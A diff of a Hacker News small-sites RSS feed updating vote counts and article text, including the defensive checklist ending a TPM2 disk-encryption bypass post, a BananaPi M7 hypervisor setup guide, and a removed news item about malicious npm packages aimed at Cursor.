+bullet and add a TPM PIN, for example by using
+<code>systemd-cryptenroll --tpm2-with-pin=yes [...]</code> when
+enrolling your key.</p><h2 id="conclusion"><span><span><a href="#conclusion" aria-label="Anchor link for: conclusion">🔗</a></span> Conclusion</span></h2><p>We've successfully carried out a filesystem confusion attack on
+two completely different systems to extract their secret volume
+key, and have seen that the majority of articles about TPM2
+auto-unlock setups are likely vulnerable to this attack.</p><p>We learned that this problem is not easily fixed, as it requires
+an additional verification step that cannot simply be activated on
+most distributions at present. It is critical to ensure that there
+is an unbroken chain of trust from the bootloader to the actual
+system.</p><p>Here is a checklist of things to consider when setting up TPM2
+auto-unlock:</p><ul><li>Your kernel and initramfs are both signed and verified (UKI or
+MOK), or you are using PCR 9 together with a shim that hashes the
+images at boot time.</li><li>You have enrolled a LUKS key in the TPM2 on at least PCR 7 (+9
+if necessary).</li><li>If you are decrypting multiple devices in the initrd, their
+decryption order is deterministic.</li><li>After decryption - and before any user executable is called -
+the initramfs verifies the identity of all encrypted disks,
+preferably by measuring a derivative of the volume key into PCR 15
+for each disk.</li><li>Your initrd's emergency shell (if any) is
+password-protected.</li><li>Your bootloader does not allow you to alter the kernel command
+line, or you've included a PCR used in the LUKS key enrollment that
+depends on the kernel command line.</li></ul><p>Thank you for taking the time to read this article - I hope you
+found it both interesting and enjoyable 😊.</p><hr><p>If you'd like to send me feedback or just reach out, feel free
+to contact me on <a href="https://matrix.to/#/@oddlama:matrix.org">Matrix</a>!</p></div></div>]]>
+            </description>
+            <link>https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/</link>
+            <guid isPermaLink="false">hacker-news-small-sites-42733640</guid>
+            <pubDate>Fri, 17 Jan 2025 03:00:10 GMT</pubDate>
+        </item>
+        <item>
+            <title>
 <![CDATA[Suchir Balaji Case Reopened: From ‘Suicide' to 'Active Investigation’]]>
             </title>
             <description>
 <![CDATA[
-Score 129 | Comments 36 (<a href="https://news.ycombinator.com/item?id=42729677">thread link</a>) | @starbucks12
+Score 131 | Comments 37 (<a href="https://news.ycombinator.com/item?id=42729677">thread link</a>) | @starbucks12
 <br/>
 January 16, 2025 | https://www.republicbiz.com/companies/suchir-balaji-case-reopened-from-suicide-to-active-investigation | <a href="https://web.archive.org/web/*/https://www.republicbiz.com/companies/suchir-balaji-case-reopened-from-suicide-to-active-investigation">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://img.republicworld.com/tr:w-800,h-450,q-75,f-auto/all_images/who-was-suchir-balaji-openai-whistleblower-who-committed-suicide-day-after-being-named-in-lawsuit-1734155464854-16_9.webp" alt=" Suchir Balaji, OpenAI Whistleblower Case reopened." width="800" height="450" fetchpriority="high" loading="eager"></p> <p> Suchir Balaji, OpenAI Whistleblower Case reopened. | Image:
@@ -40,7 +742,7 @@ January 16, 2025 | https://www.republicbiz.com/companies/suchir-balaji-case-reop
             </title>
             <description>
 <![CDATA[
-Score 68 | Comments 59 (<a href="https://news.ycombinator.com/item?id=42727629">thread link</a>) | @Ericson2314
+Score 70 | Comments 60 (<a href="https://news.ycombinator.com/item?id=42727629">thread link</a>) | @Ericson2314
 <br/>
 January 16, 2025 | https://www.etany.org/penn-station-can-handle-the-load | <a href="https://web.archive.org/web/*/https://www.etany.org/penn-station-can-handle-the-load">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
@@ -2960,7 +3662,7 @@ January 16, 2025 | https://www.etany.org/penn-station-can-handle-the-load | <a h
             </title>
             <description>
 <![CDATA[
-Score 149 | Comments 60 (<a href="https://news.ycombinator.com/item?id=42726584">thread link</a>) | @crazylogger
+Score 164 | Comments 63 (<a href="https://news.ycombinator.com/item?id=42726584">thread link</a>) | @crazylogger
 <br/>
 January 16, 2025 | https://blog.yfzhou.fyi/posts/tdd-llm/ | <a href="https://web.archive.org/web/*/https://blog.yfzhou.fyi/posts/tdd-llm/">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
@@ -3022,7 +3724,7 @@ January 16, 2025 | https://blog.yfzhou.fyi/posts/tdd-llm/ | <a href="https://web
             </title>
             <description>
 <![CDATA[
-Score 456 | Comments 158 (<a href="https://news.ycombinator.com/item?id=42725147">thread link</a>) | @blendergeek
+Score 497 | Comments 170 (<a href="https://news.ycombinator.com/item?id=42725147">thread link</a>) | @blendergeek
 <br/>
 January 16, 2025 | https://zadzmo.org/code/nepenthes/ | <a href="https://web.archive.org/web/*/https://zadzmo.org/code/nepenthes/">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
@@ -3199,7 +3901,7 @@ number resets to zero.</p>
             </title>
             <description>
 <![CDATA[
-Score 480 | Comments 197 (<a href="https://news.ycombinator.com/item?id=42724284">thread link</a>) | @DearNarwhal
+Score 543 | Comments 217 (<a href="https://news.ycombinator.com/item?id=42724284">thread link</a>) | @DearNarwhal
 <br/>
 January 16, 2025 | https://joeyehand.com/blog/2025/01/15/i-ditched-the-algorithm-for-rssand-you-should-too/ | <a href="https://web.archive.org/web/*/https://joeyehand.com/blog/2025/01/15/i-ditched-the-algorithm-for-rssand-you-should-too/">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-md-component="container">
@@ -3388,10 +4090,12 @@ Linked are excellent articles for first-time readers!</p>
             </title>
             <description>
 <![CDATA[
-Score 70 | Comments 23 (<a href="https://news.ycombinator.com/item?id=42722870">thread link</a>) | @kumiokun
+Score 75 | Comments 27 (<a href="https://news.ycombinator.com/item?id=42722870">thread link</a>) | @kumiokun
 <br/>
 January 16, 2025 | https://blog.kumio.org/posts/2025/01/bananapim7-hvm.html | <a href="https://web.archive.org/web/*/https://blog.kumio.org/posts/2025/01/bananapim7-hvm.html">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>The <a href="https://wiki.banana-pi.org/Banana_Pi_BPI-M7">BananaPi M7</a><sup><a href="#user-content-fn-bpi-guide" id="user-content-fnref-bpi-guide" data-footnote-ref="" aria-describedby="footnote-label">1</a></sup> <sup><a href="#user-content-fn-bpi-wiki" id="user-content-fnref-bpi-wiki" data-footnote-ref="" aria-describedby="footnote-label">2</a></sup> aka <a href="https://www.armsom.org/sige7">ArmSoM-Sige7</a><sup><a href="#user-content-fn-armsom-docs" id="user-content-fnref-armsom-docs" data-footnote-ref="" aria-describedby="footnote-label">3</a></sup> has attractive specs for use as an efficient but capable device for small-scale server deployment. As it’s performant enough to be interesting for real-world mixed workloads with some margin, it makes sense to consider it as a KVM hypervisor. Very relevant for setting up a small private cloud (雲立て or “kumotate”). This article documents preparing such board for use as a general Linux server (using Armbian), and then setting it up as a KVM hypervisor (using QEMU and libvirtd) to run Linux virtual machines.</p>
+<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><em>Content available in <a href="https://blog.kumio.org/posts/2025/01/bananapim7-hvm.md">markdown</a> and <a href="https://blog.kumio.org/posts/2025/01/bananapim7-hvm.html">html</a> formats</em></p>
+<hr>
+<p>The <a href="https://wiki.banana-pi.org/Banana_Pi_BPI-M7">BananaPi M7</a><sup><a href="#user-content-fn-bpi-guide" id="user-content-fnref-bpi-guide" data-footnote-ref="" aria-describedby="footnote-label">1</a></sup> <sup><a href="#user-content-fn-bpi-wiki" id="user-content-fnref-bpi-wiki" data-footnote-ref="" aria-describedby="footnote-label">2</a></sup> aka <a href="https://www.armsom.org/sige7">ArmSoM-Sige7</a><sup><a href="#user-content-fn-armsom-docs" id="user-content-fnref-armsom-docs" data-footnote-ref="" aria-describedby="footnote-label">3</a></sup> has attractive specs for use as an efficient but capable device for small-scale server deployment. As it’s performant enough to be interesting for real-world mixed workloads with some margin, it makes sense to consider it as a KVM hypervisor. Very relevant for setting up a small private cloud (雲立て or “kumotate”). This article documents preparing such board for use as a general Linux server (using rmbian), and then setting it up as a KVM hypervisor (using QEMU and libvirtd) to run Linux virtual machines.</p>
 <p><img alt="ArmSoM-Sige7" width="526" height="251" loading="lazy" decoding="async" src="https://blog.kumio.org/assets/sige7.BPA2qCOf_Z278sro.webp"></p>
 <p>Some interesting use-cases:</p>
 <ul>
@@ -3427,7 +4131,7 @@ January 16, 2025 | https://blog.kumio.org/posts/2025/01/bananapim7-hvm.html | <a
 </ul>
 </li>
 </ul>
-<p>As the RK3588 SoC is relatively recent and the board newer, it still took some effort to figure out the right pieces to get a stable configuration with Debian. RK3588 compatibility is still not fully mainlined into the Linux kernel and you need the right device-tree overlay (dtb). This is expected for this class of boards and <a href="https://www.jeffgeerling.com/blog/2024/why-raspberry-pi-sbc-guy">why some people still prefer RasPis</a>. While we want as close to vanilla upstream Debian as possible, it does not run directly on the board. Patching it ourselves is not attractive. Hence we turn to Armbian.
+<p>As the RK3588 SoC is relatively recent and the board newer, it still took some effort to figure out the right pieces to get a stable configuration with Debian. RK3588 compatibility is still not fully mainlined into the Linux kernel and you need the right device-tree overlay (dtb). This is expected for this class of boards and <a href="https://www.jeffgeerling.com/blog/2024/why-raspberry-pi-sbc-guy">why some people still prefer RasPis</a>. While we want as close to vanilla upstream Debian as possible, it does not run directly on the board. Patching it ourselves is not attractive. Hence we turn to <a href="https://armbian.com/">Armbian</a>.
 We will also perform a rudimentary <a href="https://libvirt.org/manpages/libvirtd.html">libvirtd</a> installation and set it up to run <a href="https://www.qemu.org/">QEMU</a> virtual machines from a ZFS zpool on the attached m.2 NVME storage.</p>
 <h3 id="hardware-notes">Hardware notes</h3>
 <h4 id="spec-summary">Spec summary</h4>
@@ -3509,24 +4213,27 @@ Armbian has support for building the following kernel versions for BananaPi M7:<
 </ul>
 </li>
 </ul>
-<p>In order to build a suitable custom Armbian image, we need to prepare our build environment. These notes are current as of Jan 2025. Armbian will by default attempt to build the image in a Docker container, which means you are not expected to install all further development dependencies on your build host.</p>
 <h2 id="armbian-build-and-install">Armbian build and install</h2>
+<p>In order to build a suitable custom Armbian image, we need to prepare our build environment. These notes are current as of Jan 2025. Armbian will by default attempt to build the image in a Docker container, which means you are not expected to install all further development dependencies on your build host.</p>
 <p>This was performed on an Arch Linux amd64 host but should work on any reasonable Linux distribution.
 Since the board and the host have different CPU architectures, we will have to rely on QEMU emulation without KVM.</p>
 <h3 id="requirements">Requirements</h3>
 <ul>
 <li>BananaPi M7</li>
 <li>microSD card</li>
-<li>m.2 SSD
+<li>m.2 SSD</li>
+<li>USB-C PSU
 <ul>
-<li>USB-C PSU</li>
 <li>Either PD 2.0 or fixed-voltage (12v/15v/19v)</li>
 </ul>
 </li>
 <li>Build host
-<a href="https://wiki.archlinux.org/title/QEMU">QEMU</a> packages installed
+<ul>
+<li><a href="https://wiki.archlinux.org/title/QEMU">QEMU</a> packages installed
 <ul>
 <li><code dir="auto">qemu-system-aarch64</code> and <code dir="auto">qemu-aarch64</code> under <code dir="auto">$PATH</code></li>
+</ul>
+</li>
 <li>Git</li>
 <li>Docker
 <ul>
@@ -3554,20 +4261,20 @@ You can iterate a bit tighter by working from a shell inside the build container
 <div><pre data-language="bash"><code><div><p><span>sudo</span><span> </span><span>dd</span><span> </span><span>of=/dev/sdxx</span><span> </span><span>if=output/images/Armbian-unofficial_24.11.1_Bananapim7_noble_current_6.12.0-crypt_minimal.img</span><span> </span><span>bs=4M</span><span> </span><span>status=progress</span><span> &amp;&amp; </span><span>sync</span></p></div></code></pre></div>
 <h3 id="first-boot">First boot</h3>
 <p>Plug in monitor, keyboard, network, and the newly flashed microSD card before finally plugging in the power and letting the board turn on.
-After a few seconds of both the red and green LEDs shinging, only the green LED should be active and you should see the screen turn on.</p>
-<p>You should see a prompt for the passphrase of encrypted root partition on the monitor. If you have the Ethernet port connected to a network with DHCP, you should also be able to unlock it remotely already:</p>
-<div><pre data-language="bash"><code><div><p><span>ssh</span><span> </span><span>-p</span><span> </span><span>2020</span><span> </span><span>root@192.168.1.123</span></p></div></code></pre></div>
-<p>You should now be prompted for the passphrase we supplied in the build command. On a subsequent first login, Armbian’s login script asks us to create a default user:</p>
+After a few seconds of both the red and green LEDs shining, only the green LED should be active and you should see the screen turn on.</p>
+<p>You should see a prompt for the passphrase of encrypted root partition on the monitor. If you have the Ethernet port connected to a network with DHCP, you can also unlock it remotely via SSH already:</p>
+<div><pre data-language="bash"><code><div><p><span>$</span><span> </span><span>ssh</span><span> </span><span>-p</span><span> </span><span>2020</span><span> </span><span>root@192.168.1.123</span></p></div><div><p><span>root@192.168.1.123</span><span>'s password:</span></p></div><div><p><span>Please unlock disk armbian-root:</span></p></div><div><p><span>cryptsetup: armbian-root set up successfully</span></p></div><div><p><span>Connection to 192.168.1.123 closed.</span></p></div></code></pre></div>
+<p>The initial root password is empty and the <code dir="auto">CRYPTROOT_PASSPHRASE</code> was supplied in the build command. On a subsequent first login, Armbian’s login script asks us to create a default user:</p>
 
 <p>After another reboot, the growroot script will expand the root partition to fill up the remainder of the card.</p>
 <h4 id="basic-security">Basic security</h4>
-<div><pre data-language="bash"><code><div><p><span># Upgrade system packages</span></p></div><div><p><span>sudo</span><span> </span><span>apt-get</span><span> </span><span>update</span><span> &amp;&amp; </span><span>sudo</span><span> </span><span>apt-get</span><span> </span><span>upgrade</span></p></div><div><p><span># Change the default passphrase</span></p></div><div><p><span>sudo</span><span> </span><span>cryptsetup</span><span> </span><span>luksChangeKey</span><span> </span><span>/dev/mmcblk1p2</span></p></div><div><p><span># Install and enable firewalld</span></p></div><div><p><span>sudo</span><span> </span><span>apt-get</span><span> </span><span>install</span><span> </span><span>--no-install-recommends</span><span> </span><span>firewalld</span><span> </span><span>nftables</span></p></div><div><p><span>sudo</span><span> </span><span>systemctl</span><span> </span><span>enable</span><span> </span><span>--now</span><span> </span><span>firewalld</span></p></div></code></pre></div>
+<div><pre data-language="bash"><code><div><p><span># Enable disable password authentication for ssh</span></p></div><div><p><span>vim</span><span> </span><span>~/.ssh/authorized</span><span> </span><span>keys</span><span>    </span><span># enter your ssh pubkey(s)</span></p></div><div><p><span>echo</span><span> </span><span>'</span><span>PasswordAuthentication no</span><span>'</span><span> </span><span>|</span><span> </span><span>sudo</span><span> </span><span>tee</span><span> </span><span>/etc/ssh/sshd_config.d/disable-pwauth.conf</span></p></div><div><p><span>sudo</span><span> </span><span>systemctl</span><span> </span><span>restart</span><span> </span><span>sshd</span></p></div><div><p><span># Upgrade system packages</span></p></div><div><p><span>sudo</span><span> </span><span>apt-get</span><span> </span><span>update</span><span> &amp;&amp; </span><span>sudo</span><span> </span><span>apt-get</span><span> </span><span>upgrade</span></p></div><div><p><span># Change the default passphrase</span></p></div><div><p><span>sudo</span><span> </span><span>cryptsetup</span><span> </span><span>luksChangeKey</span><span> </span><span>/dev/mmcblk1p2</span></p></div><div><p><span># Install and enable firewalld</span></p></div><div><p><span>sudo</span><span> </span><span>apt-get</span><span> </span><span>install</span><span> </span><span>--no-install-recommends</span><span> </span><span>firewalld</span><span> </span><span>nftables</span></p></div><div><p><span>sudo</span><span> </span><span>systemctl</span><span> </span><span>enable</span><span> </span><span>--now</span><span> </span><span>firewalld</span></p></div></code></pre></div>
 <h2 id="storage-preparation">Storage preparation</h2>
 <p>With the base OS set up (why don’t we shut down and take a backup ;)), it’s time to set up our storage pool. This is where we will store our VM images and dynamic data that we don’t want to thrash the SD card with. Even with a single drive, ZFS gives us:</p>
 <ul>
 <li>integrity guarantees through checksums - no silent corruption</li>
 <li>instant snapshots, clones, and rollbacks</li>
-<li>dynamic provisioning of volumes integrating with libvirt[^libvirt-zfs]</li>
+<li>dynamic provisioning of volumes integrating with <a href="https://libvirt.org/storage.html#zfs-pool">libvirt</a></li>
 <li>better use of memory for caching (ARC)</li>
 <li>native encryption and compression</li>
 </ul>
@@ -3668,7 +4375,7 @@ In lack of proper hardware keys, one could still do better by instead storing th
             </title>
             <description>
 <![CDATA[
-Score 583 | Comments 350 (<a href="https://news.ycombinator.com/item?id=42712433">thread link</a>) | @MattSayar
+Score 587 | Comments 352 (<a href="https://news.ycombinator.com/item?id=42712433">thread link</a>) | @MattSayar
 <br/>
 January 15, 2025 | https://mattsayar.com/why-does-cloudflare-pages-have-such-a-generous-free-tier/ | <a href="https://web.archive.org/web/*/https://mattsayar.com/why-does-cloudflare-pages-have-such-a-generous-free-tier/">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This site is hosted with Cloudflare Pages and I'm really happy with it. When I explored <span><a href="https://mattsayar.com/creating-a-simple-free-website-in-2025/">how to create a site like mine in 2025</a></span>, I wondered why there's an abundance of good, free hosting these days. Years ago, you'd <i>have</i> to pay for hosting, but now there's tons of sites with generous free tiers like <a href="https://pages.github.com/"><span>GitHub Pages</span></a>,&nbsp;<a href="https://docs.gitlab.com/ee/user/project/pages/"><span>GitLab Pages</span></a>,&nbsp;<a href="https://www.netlify.com/pricing/"><span>Netlify</span></a>, etc.</p><figure><img loading="lazy" src="https://mattsayar.com/media/posts/8/SCR-20250107-qxoo-3.png" alt="" width="2432" height="1570" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://mattsayar.com/media/posts/8/responsive/SCR-20250107-qxoo-3-xs.png 640w, https://mattsayar.com/media/posts/8/responsive/SCR-20250107-qxoo-3-sm.png 768w, https://mattsayar.com/media/posts/8/responsive/SCR-20250107-qxoo-3-md.png 1024w, https://mattsayar.com/media/posts/8/responsive/SCR-20250107-qxoo-3-lg.png 1366w, https://mattsayar.com/media/posts/8/responsive/SCR-20250107-qxoo-3-xl.png 1600w, https://mattsayar.com/media/posts/8/responsive/SCR-20250107-qxoo-3-2xl.png 1920w"><figcaption>But Cloudflare's Free tier reigns supreme</figcaption></figure><p>There are various types of usage limits across the platforms, but the biggest one to worry about is bandwidth. Nothing can make your heartrate faster than realizing your site is going viral and you either have to foot the bill or your site gets hugged to death. I gathered some limits from various services here.</p><table><tbody><tr><td><strong>Service</strong></td><td><strong>Free Bandwidth Limit/Mo</strong></td><td><strong>Notes</strong></td></tr><tr><td><a href="https://pages.cloudflare.com/">Cloudflare Pages</a></td><td>Unlimited</td><td><a href="https://community.cloudflare.com/t/what-is-maximum-monthly-bandwidth-limit-for-cloudflare-pages-in-free-account/650087">Just don't host Netflix</a></td></tr><tr><td><a href="https://docs.github.com/en/pages/getting-started-with-github-pages/about-github-pages#usage-limits">GitHub Pages</a></td><td>Soft 100 GBs</td><td>"Soft" = probably fine if you go viral on reddit sometimes</td></tr><tr><td><a href="https://docs.gitlab.com/ee/user/gitlab_com/index.html#gitlabcom-specific-rate-limits">GitLab Pages</a></td><td>X,000 requests/min</td><td>Lots of nuances, somewhat confusing</td></tr><tr><td><a href="https://www.netlify.com/pricing/">Netlify</a></td><td>100GB</td><td>Pay for more</td></tr><tr><td><a href="https://aws.amazon.com/s3/pricing/?nc=sn&amp;loc=4">AWS S3</a></td><td>100 GB</td><td>Credit card required, just in case... but apparently Amazon is very forgiving of accidental overages</td></tr></tbody></table><p>The platforms generally say your site shouldn't be more than ~1GB in size and less than some tens of thousands of files. This site in its nascency is about 15MB and &lt;150 files. I don't plan to start posting RAW photo galleries, so if I start hitting those limits, <em>please</em> be concerned for my health and safety.</p><h3>So why is Cloudflare Pages' bandwidth unlimited?</h3><p>Why indeed. Strategically, Cloudflare offering unlimited bandwidth for small static sites like mine fits in with its other benevolent services like <a href="https://one.one.one.one/">1.1.1.1</a> (that domain lol) and <a href="https://www.cloudflare.com/application-services/products/ddos-for-web/">free DDOS protection</a>.</p><blockquote><p>Cloudflare made a decision early in our history that we wanted to make security tools as widely available as possible. This meant that we provided many tools for free, or at minimal cost, to best limit the impact and effectiveness of a wide range of cyberattacks.</p><p><span>- <a href="https://blog.cloudflare.com/cloudflares-abuse-policies-and-approach/#security-services">Matthew Prince</a>, Cloudflare Co-Founder and CEO</span></p></blockquote><p>But I want to think of more practical reasons. First, a static website is so lightweight and easy to serve up that it's barely a blip on the radar. For example, the page you're reading now is ~2.2MB, which is in line with <a href="https://httparchive.org/reports/page-weight">typical page weights</a> of ~2.7MB these days. With Cloudflare's <a href="https://www.cloudflare.com/network/">ubiquitous network</a>, caching, and <a href="https://cf-assets.www.cloudflare.com/slt3lc6tev37/4CNFnqPuNxswEDKKXGkbjc/ecdbc87cfa85f07ea5da9f20a284c710/How-Cloudflare_optimizes_web_content_for_faster_page_loads.pdf">optimization</a>, that's a small lift. My site ain't exactly Netflix.</p><figure><img loading="lazy" src="https://mattsayar.com/media/posts/8/SCR-20250108-jzte.png" alt="" width="2440" height="1152" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://mattsayar.com/media/posts/8/responsive/SCR-20250108-jzte-xs.png 640w, https://mattsayar.com/media/posts/8/responsive/SCR-20250108-jzte-sm.png 768w, https://mattsayar.com/media/posts/8/responsive/SCR-20250108-jzte-md.png 1024w, https://mattsayar.com/media/posts/8/responsive/SCR-20250108-jzte-lg.png 1366w, https://mattsayar.com/media/posts/8/responsive/SCR-20250108-jzte-xl.png 1600w, https://mattsayar.com/media/posts/8/responsive/SCR-20250108-jzte-2xl.png 1920w"></figure><p>Second, companies like Cloudflare benefit from a fast, secure internet. If the internet is fast and reliable, more people will want to use it. The more people that want to use it, the more companies that offer their services on the internet. The more companies that offer services on the internet, the more likely they'll need to buy security products. Oh look, Cloudflare happens to have a suite of security products for sale! They flywheel spins...</p><p>Third, now that I’m familiar with Cloudflare’s slick UI, I’m going to think favorably about it in the future if my boss ever asks me about their products. I took zero risk trying it out, and now that I have a favorable impression, I'm basically contributing to grassroots word-of-mouth marketing with this very article. Additionally, there's plenty of "Upgrade to Pro" buttons sprinkled about. It's the <a href="https://en.wikipedia.org/wiki/Freemium">freemium model</a> at work.</p><h3>What does Cloudflare say?</h3><p>Now that I have my practical reasons, I'm curious what Cloudflare officially says. I couldn't find anything specifically in the Cloudflare Pages docs, or anywhere else! Neither the <a href="https://blog.cloudflare.com/cloudflare-pages/">beta announcement</a> or the <a href="https://blog.cloudflare.com/cloudflare-pages-ga/">GA announcement</a> have the word "bandwidth" on the page.</p><p><em>Update: <a href="https://news.ycombinator.com/item?id=42712845">shubhamjain on HN</a> found a <a href="https://webmasters.stackexchange.com/questions/88659/how-can-cloudflare-offer-a-free-cdn-with-unlimited-bandwidth/88685#88685">great quote from Matt Prince</a> that explains it's about data and scale. And <a href="https://news.ycombinator.com/item?id=42712952">xd1936 helpfully found</a> the <a href="https://blog.cloudflare.com/cloudflares-commitment-to-free/">official comment</a> that evaded my googling.</em></p><p>I don't know anybody important enough to get me an official comment, so I suppose I just have to rely on my intuition. Fortunately, I don't have all my eggs in one basket, since my site is partially hosted on GitHub. Thanks to that diversification, if Cloudflare decides to change their mind someday, I've got options!</p></div></div>]]>
@@ -3797,7 +4504,7 @@ January 15, 2025 | https://tisonkun.io/posts/oss-twin | <a href="https://web.arc
             </title>
             <description>
 <![CDATA[
-Score 412 | Comments 237 (<a href="https://news.ycombinator.com/item?id=42708773">thread link</a>) | @csantini
+Score 413 | Comments 237 (<a href="https://news.ycombinator.com/item?id=42708773">thread link</a>) | @csantini
 <br/>
 January 15, 2025 | https://claudio.uk/posts/epub-to-audiobook.html | <a href="https://web.archive.org/web/*/https://claudio.uk/posts/epub-to-audiobook.html">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
@@ -4047,7 +4754,7 @@ if __name__ == '__main__':
             </title>
             <description>
 <![CDATA[
-Score 918 | Comments 893 (<a href="https://news.ycombinator.com/item?id=42707238">thread link</a>) | @fzliu
+Score 936 | Comments 906 (<a href="https://news.ycombinator.com/item?id=42707238">thread link</a>) | @fzliu
 <br/>
 January 14, 2025 | https://grantslatton.com/nobody-cares | <a href="https://web.archive.org/web/*/https://grantslatton.com/nobody-cares">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
@@ -4117,7 +4824,7 @@ January 14, 2025 | https://grantslatton.com/nobody-cares | <a href="https://web.
             </title>
             <description>
 <![CDATA[
-Score 190 | Comments 193 (<a href="https://news.ycombinator.com/item?id=42705077">thread link</a>) | @arnath
+Score 191 | Comments 194 (<a href="https://news.ycombinator.com/item?id=42705077">thread link</a>) | @arnath
 <br/>
 January 14, 2025 | https://www.vijayp.dev/blog/rewrite-plain-html/ | <a href="https://web.archive.org/web/*/https://www.vijayp.dev/blog/rewrite-plain-html/">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
@@ -4587,7 +5294,7 @@ January 14, 2025 | https://ip-vote.com/geolocation_via_latency.html | <a href="h
             </title>
             <description>
 <![CDATA[
-Score 242 | Comments 52 (<a href="https://news.ycombinator.com/item?id=42703282">thread link</a>) | @otoolep
+Score 243 | Comments 52 (<a href="https://news.ycombinator.com/item?id=42703282">thread link</a>) | @otoolep
 <br/>
 January 14, 2025 | https://philipotoole.com/how-is-rqlite-tested/ | <a href="https://web.archive.org/web/*/https://philipotoole.com/how-is-rqlite-tested/">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
@@ -4655,7 +5362,7 @@ January 14, 2025 | https://philipotoole.com/how-is-rqlite-tested/ | <a href="htt
             </title>
             <description>
 <![CDATA[
-Score 201 | Comments 27 (<a href="https://news.ycombinator.com/item?id=42700852">thread link</a>) | @mscolnick
+Score 202 | Comments 27 (<a href="https://news.ycombinator.com/item?id=42700852">thread link</a>) | @mscolnick
 <br/>
 January 14, 2025 | https://docs.marimo.io/guides/publishing/playground/#open-notebooks-hosted-on-github | <a href="https://web.archive.org/web/*/https://docs.marimo.io/guides/publishing/playground/#open-notebooks-hosted-on-github">archive.org</a>
 <br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-md-component="container">
@@ -5526,667 +6233,6 @@ If you liked this you can comment below, share it, or subscribe to get email upd
             <link>https://www.coryzue.com/writing/solopreneur/</link>
             <guid isPermaLink="false">hacker-news-small-sites-42696822</guid>
             <pubDate>Tue, 14 Jan 2025 13:21:28 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Snyk security researcher deploys malicious NPM packages targeting cursor.com]]>
-            </title>
-            <description>
-<![CDATA[
-Score 568 | Comments 311 (<a href="https://news.ycombinator.com/item?id=42690473">thread link</a>) | @arkadiyt
-<br/>
-January 13, 2025 | https://sourcecodered.com/snyk-malicious-npm-package/ | <a href="https://web.archive.org/web/*/https://sourcecodered.com/snyk-malicious-npm-package/">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
-				
-				
-				
-				
-				<div><p>You can see in the screenshot that the data is then exfiltrated to a website that the attacker owns.</p>
-<p>Now, typically, when we see packages like this, they are attempting to perform a dependency confusion attack on a specific company.&nbsp; I don’t know if Cursor.com has a bug bounty program or a specific background. Still, I would suspect that Cursor has several NPM private packages named “cursor-always-local”, “cursor-retrieval”, and “cursor-shadow-workspace”.&nbsp; The person who created these packages is probably hoping that Cursor employees accidentally install these public packages, which will send their data to the attacker-controlled web service.</p>
-<p>Luckily, in addition to me seeing these files, the OpenSSF package analysis scanner identified these packages as malicious.&nbsp; OSV generated 3 malware advisories:&nbsp; MAL-2025-27, MAL-2025-28 and MAL-2025-29.&nbsp; You can see the malware advisories here:&nbsp; <a href="https://osv.dev/list?q=cursor&amp;ecosystem=npm">https://osv.dev/list?q=cursor&amp;ecosystem=npm</a></p>
-<h2><strong>Who deployed these malicious packages?</strong></h2>
-<p>Okay, we know what the packages do when installing them, and we think they target <a href="https://cursor.com/">Cursor.com</a>.&nbsp; Who would do this?&nbsp; Well, the answer is in the NPM package metadata.</p>
-<p>The user who published the NPM package uses a snyk.io email address for the Snyk Security Labs team.&nbsp; This part of the metadata cannot be faked.&nbsp; The author field in the metadata specifically mentions an employee at Snyk.&nbsp; This part of the NPM package metadata can be faked, but since the publisher is a verified Snyk email, my guess is that this genuinely came from Snyk.</p>
-</div>
-			</div></div>]]>
-            </description>
-            <link>https://sourcecodered.com/snyk-malicious-npm-package/</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42690473</guid>
-            <pubDate>Mon, 13 Jan 2025 22:38:27 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Nvidia might do for desktop AI what it did for desktop gaming]]>
-            </title>
-            <description>
-<![CDATA[
-Score 59 | Comments 55 (<a href="https://news.ycombinator.com/item?id=42687510">thread link</a>) | @walterbell
-<br/>
-January 13, 2025 | https://www.theangle.com/p/nvidia-might-do-for-desktop-ai-what | <a href="https://web.archive.org/web/*/https://www.theangle.com/p/nvidia-might-do-for-desktop-ai-what">archive.org</a>
